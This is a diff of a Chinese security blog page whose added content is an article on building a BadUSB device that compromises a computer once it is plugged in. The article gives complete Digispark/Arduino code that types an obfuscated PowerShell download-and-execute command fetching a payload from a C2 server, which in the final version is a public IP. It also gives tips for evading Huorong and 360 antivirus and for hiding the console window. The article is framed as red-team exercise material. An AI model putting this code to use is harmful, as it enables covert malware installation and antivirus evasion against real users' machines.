@@ -6,19 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://javb1.github.io">
-  <title>Archives: 2023/5 | 光与眼睛</title>
+  <title>近源渗透—插U盘即可上线 | 光与眼睛</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="分享">
-<meta property="og:type" content="website">
-<meta property="og:title" content="光与眼睛">
-<meta property="og:url" content="https://javb1.github.io/archives/2023/05/">
+  <meta name="description" content="近源渗透—插U盘即可上线0x01前言攻防演练的时候有查U盘就能上线靶标电脑的操作（近源渗透），这种攻击手法虽然看着猥琐，但是是简单粗暴。今天团队的师傅写了一篇文章讲解这个攻击手法的原理，欢迎师傅们点赞分享。 0x02 准备阶段1、购买BadUsb 2、安装Arduino IDE 3、配置Arduino IDE ，添加开发板，安装驱动。 1参考链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近源渗透—插U盘即可上线">
+<meta property="og:url" content="https://javb1.github.io/2023/05/25/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E2%80%94%E6%8F%92U%E7%9B%98%E5%8D%B3%E5%8F%AF%E4%B8%8A%E7%BA%BF/">
 <meta property="og:site_name" content="光与眼睛">
-<meta property="og:description" content="分享">
+<meta property="og:description" content="近源渗透—插U盘即可上线0x01前言攻防演练的时候有查U盘就能上线靶标电脑的操作（近源渗透），这种攻击手法虽然看着猥琐，但是是简单粗暴。今天团队的师傅写了一篇文章讲解这个攻击手法的原理，欢迎师傅们点赞分享。 0x02 准备阶段1、购买BadUsb 2、安装Arduino IDE 3、配置Arduino IDE ，添加开发板，安装驱动。 1参考链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png">
+<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-1.png">
+<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-2.png">
+<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-3.png">
+<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-4.png">
+<meta property="article:published_time" content="2023-05-24T23:14:01.000Z">
+<meta property="article:modified_time" content="2023-05-24T23:38:42.079Z">
 <meta property="article:author" content="光与眼睛">
+<meta property="article:tag" content="攻防">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png">
   
     <link rel="alternative" href="/atom.xml" title="光与眼睛" type="application/atom+xml">
   
@@ -187,41 +196,140 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-近源渗透—插U盘即可上线" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/05/25/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E2%80%94%E6%8F%92U%E7%9B%98%E5%8D%B3%E5%8F%AF%E4%B8%8A%E7%BA%BF/" class="archive-article-date">
-        <time datetime="2023-05-24T23:14:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-25</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/05/25/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E2%80%94%E6%8F%92U%E7%9B%98%E5%8D%B3%E5%8F%AF%E4%B8%8A%E7%BA%BF/" target="_blank">近源渗透—插U盘即可上线</a>
   
+    <h1 class="article-title" itemprop="name">
+      近源渗透—插U盘即可上线
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2023/05/25/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E2%80%94%E6%8F%92U%E7%9B%98%E5%8D%B3%E5%8F%AF%E4%B8%8A%E7%BA%BF/" class="archive-article-date">
+        <time datetime="2023-05-24T23:14:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-25</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.6k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">6分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="近源渗透—插U盘即可上线"><a href="#近源渗透—插U盘即可上线" class="headerlink" title="近源渗透—插U盘即可上线"></a>近源渗透—插U盘即可上线</h2><h4 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h4><p>攻防演练的时候有查U盘就能上线靶标电脑的操作（近源渗透），这种攻击手法虽然看着猥琐，但是是简单粗暴。今天团队的师傅写了一篇文章讲解这个攻击手法的原理，欢迎师傅们点赞分享。</p>
+<h4 id="0x02-准备阶段"><a href="#0x02-准备阶段" class="headerlink" title="0x02 准备阶段"></a>0x02 准备阶段</h4><p>1、购买BadUsb</p>
+<p>2、安装Arduino IDE</p>
+<p>3、配置Arduino IDE ，添加开发板，安装驱动。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.jianshu.com/p/b33d61fc2678</span><br></pre></td></tr></table></figure>
+
+<p>4、掌握Digispark编程语法。（语法较简单，可以边查边写）</p>
+<p>至此，BadUsb和开发环境均已配置完毕，可以开始编写代码。</p>
+<span id="more"></span>
+
+<h4 id="0x03-编写代码"><a href="#0x03-编写代码" class="headerlink" title="0x03 编写代码"></a>0x03 编写代码</h4><p>编写代码前，我们首先要了解BadUsb的大致原理，本质上就是插入电脑后可以模拟键盘输入，既然是模拟键盘输入，我们可以先写出一个大致的代码框架。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOD_SHIFT_LEFT      (1&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOD_CONTROL_LEFT    (1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_ENTER   40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_CAPS_LOCK 0x39</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> </span><br><span class="line">&#123;DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line"> DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"> DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line"> DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); <span class="comment">//win+r</span></span><br><span class="line"> DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line"> DigiKeyboard.print(F(<span class="string">&quot;cmd&quot;</span>)); <span class="comment">//输入cmd</span></span><br><span class="line"> DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line"> DigiKeyboard.sendKeyStroke(KEY_ENTER); <span class="comment">//回车</span></span><br><span class="line"> DigiKeyboard.delay(<span class="number">500</span>);<span class="comment">//后面输入恶意代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码先声明了一些键盘按键代表的字符，然后通过键盘唤起CMD。其中插入BadUsb后间隔2秒开始执行程序，每次输入字符后都间隔0.5s。</p>
+<p>代码框架编写完成后，就可以开始构造我们的免杀恶意代码了。</p>
+<p>要想通过键盘输入上线的我们的C2服务器，有2种思路。通过powershell命令上线 或 通过命令行文件下载恶意文件上线。</p>
+<p>1、文件下载上线</p>
+<p>考虑到免杀问题，certutil这些常见的命令几乎被所有杀软拦截，网上公开的绕过方法（例如双写certutil）可以绕过火绒，但360无法绕过。</p>
+<p>文件成功下载后，恶意文件的免杀也具有一定局限性，所以如果考虑免杀，那么通过文件下载这种模式来实现BadUsb上线存在很大难度。</p>
+<p>2、powershell命令上线</p>
+<p>powershell上线也分两种方式</p>
+<p>(1)通过ps1文件上线</p>
+<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png" alt="640"></p>
+<p>ps1文件免杀效果好，Github有很多针对ps1文件的免杀项目，可以轻松绕过国内主流杀软。</p>
+<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-1.png" alt="640-1"></p>
+<p>但ps1文件庞大的代码量又带来了一个问题，在我们编写完成代码框架后，使用Arduino IDE进行编译，提示“当前已使用了45%的存储空间”，而如果我们将ps1文件中的全部代码编译，则会存在闪存空间不足的问题。</p>
+<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-2.png" alt="640-2"></p>
+<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-3.png" alt="640-3"></p>
+<p>有2种办法解决这个问题，使用钞能力购买闪存更大的开发板，或精简我们的ps1文件内容。至此通过ps1文件上线这个思路也在这里断了。</p>
+<p> (2)通过web服务上线</p>
+<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-4.png" alt="640-4"></p>
+<p>通过这种方法生成的payload较为精简，不存在闪存不足的问题，只需要针对性的做一下免杀即可。</p>
+<p>这里给出我免杀的方法，设置别名+^字符间隔+加号拼接字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c echo set-alias -name xz -value IEX;x^z (New-Object &quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://19&#x27;+&#x27;2.168.1.1&#x27;+&#x27;/a&#x27;) | p^o^w^e^r^s^h^e^l^l -</span><br></pre></td></tr></table></figure>
+
+<p>这里没有添加后台运行powershell的参数，因为hidden参数会影响免杀效果，这样的运行方式实测可以绕过火绒和360。</p>
+<p>那么代码就算是初步完成了，如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define MOD_SHIFT_LEFT      (1&lt;&lt;1)</span><br><span class="line">#define MOD_CONTROL_LEFT    (1&lt;&lt;0)</span><br><span class="line">#define KEY_ENTER   40#define KEY_CAPS_LOCK 0x39</span><br><span class="line">void setup()</span><br><span class="line">&#123;</span><br><span class="line">DigiKeyboard.delay(2000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(2000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">// powershell上线 免杀火绒360 窗口不隐藏  需要点鼠标杀软放行</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd&quot;)); //输入cmd</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd /c echo set-alias -name xz -value IEX;x^z (New-Object &quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://19&#x27;+&#x27;2.168.1.1&#x27;+&#x27;/a&#x27;) | p^o^w^e^r^s^h^e^l^l -&quot;)); //POWERSHELL上线</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车</span><br><span class="line">&#125;</span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-代码优化"><a href="#0x04-代码优化" class="headerlink" title="0x04 代码优化"></a>0x04 代码优化</h4><p>将写好的代码编译并烧录进BadUsb后，其实效果并没有那么理想，有如下几个问题：</p>
+<p>1、部分电脑存在默认中文输入法，在模拟键盘输入的过程中会存在中文输入，未达到预期输入的内容</p>
+<p>解决方案：开始模拟键盘输入前锁定大小写，相应的我们的免杀代码也要做出对应的大小写修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK); //锁定大小写，防止默认中文输入法</span><br><span class="line"></span><br><span class="line">DigiKeyboard.print(F(&quot;cmd /c echo set-alias -name xz -value IEX;x^z (New-Object \&quot;NeT.WeBClienT\&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://19&#x27;+&#x27;2.168.1.1&#x27;+&#x27;/A’) | p^o^w^e^r^s^h^e^l^l -&quot;)); //POWERSHELL上线 路径大小写都要有a A</span><br></pre></td></tr></table></figure>
+
+<p>2、powershell运行完毕后，桌面留下一个黑框非常显眼。</p>
+<p>解决方案：模拟键盘输入wind+d返回桌面隐藏cmd黑框，上线cs后立即迁移进程即可。</p>
+<p>最终优化后的代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define MOD_SHIFT_LEFT      (1&lt;&lt;1)</span><br><span class="line">#define MOD_CONTROL_LEFT    (1&lt;&lt;0)</span><br><span class="line">#define KEY_ENTER   40</span><br><span class="line">#define KEY_CAPS_LOCK 0x39</span><br><span class="line">void setup() &#123;</span><br><span class="line">DigiKeyboard.delay(2000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(2000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK); //锁定大小写，防止默认中文输入法</span><br><span class="line">DigiKeyboard.delay(500);// powershell上线 免杀火绒360 窗口不隐藏  需要点鼠标杀软放行</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd&quot;)); //输入cmd</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd /c echo set-alias -name xz -value IEX;x^z (New-Object \&quot;NeT.WeBClienT\&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://4&#x27;+&#x27;3.138.111.78&#x27;+&#x27;/A&#x27;) | p^o^w^e^r^s^h^e^l^l -&quot;)); //POWERSHELL上线 路径大小写都要有a A</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT); //win+d</span><br><span class="line">&#125;</span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>以上文章来源于李白你好 ，作者李白团队-Jerry</strong></p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          光与眼睛
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://javb1.github.io/2023/05/25/近源渗透—插U盘即可上线/" title="近源渗透—插U盘即可上线" target="_blank">https://javb1.github.io/2023/05/25/近源渗透—插U盘即可上线/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -233,191 +341,55 @@
 		</ul>
 	</div>
 
-          
+    
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/05/23/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8C%81%E4%B9%85%E5%8C%96/" class="archive-article-date">
-        <time datetime="2023-05-23T08:23:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-23</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2023/05/23/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8C%81%E4%B9%85%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">自启动持久化</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/05/23/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8C%81%E4%B9%85%E5%8C%96/" target="_blank">自启动持久化</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">免杀</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/05/23/Linux-Dirty-Pipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-0847%EF%BC%89/" class="archive-article-date">
-        <time datetime="2023-05-23T03:28:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-23</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/05/23/Linux-Dirty-Pipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-0847%EF%BC%89/" target="_blank">Linux Dirty Pipe权限提升漏洞（CVE-2022-0847）</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">poc 权限提升</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/05/21/%E5%BE%AE%E8%BD%AF%20Word%20RCE%20%EF%BC%88CVE-2023-21716%EF%BC%89/" class="archive-article-date">
-        <time datetime="2023-05-21T15:26:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-21</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/05/21/%E5%BE%AE%E8%BD%AF%20Word%20RCE%20%EF%BC%88CVE-2023-21716%EF%BC%89/" target="_blank">CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption(微软word存在RCE漏洞)</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">poc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/05/19/CentOS%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3156%EF%BC%89/" class="archive-article-date">
-        <time datetime="2023-05-18T23:43:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-19</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/05/19/CentOS%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3156%EF%BC%89/" target="_blank">CentOS sudo权限提升漏洞（CVE-2021-3156）</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">poc 权限提升</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
+
 
 
           </div>
@@ -458,8 +430,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
